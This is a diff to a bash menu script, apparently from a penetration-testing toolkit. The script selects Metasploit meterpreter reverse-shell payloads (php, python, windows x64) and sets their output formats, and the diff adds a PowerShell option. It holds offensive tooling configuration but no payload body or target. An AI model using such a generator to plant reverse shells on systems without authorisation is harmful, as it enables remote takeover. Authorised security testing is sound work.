@@ -18,9 +18,10 @@ echo "10.  php/meterpreter_reverse_tcp             (.php)"
 echo "11.  python/meterpreter_reverse_https        (.py)"
 echo "12.  python/meterpreter_reverse_tcp          (.py)"
 echo "13.  windows/x64/meterpreter_reverse_https   (.exe)"
-echo "14.  windows/x64/meterpreter_reverse_tcp     (.exe)"
-echo "15.  windows/x64/meterpreter_reverse_tcp     (.aspx)"
-echo "16.  Previous menu"
+echo "14.  windows/x64/meterpreter_reverse_tcp     (.aspx)"
+echo "15.  windows/x64/meterpreter_reverse_tcp     (.exe)"
+echo "16.  windows/x64/meterpreter_reverse_tcp     (.ps1)"
+echo "17.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
@@ -93,16 +94,21 @@ case $choice in
           arch="x64"
           platform="windows";;
      14) payload="windows/x64/meterpreter_reverse_tcp"
-          extention=".exe"
-          format="exe"
-          arch="x64"
-          platform="windows";;
-     15) payload="windows/x64/meterpreter_reverse_tcp"
           extention=".aspx"
           format="aspx"
           arch="x64"
           platform="windows";;
-     16) f_main;;
+     15) payload="windows/x64/meterpreter_reverse_tcp"
+          extention=".exe"
+          format="exe"
+          arch="x64"
+          platform="windows";;
+     16) payload="windows/x64/meterpreter_reverse_tcp"
+          extention=".ps1"
+          format="powershell"
+          arch="x64"
+          platform="windows";;
+     17) f_main;;
      *) f_error;;
 esac
 
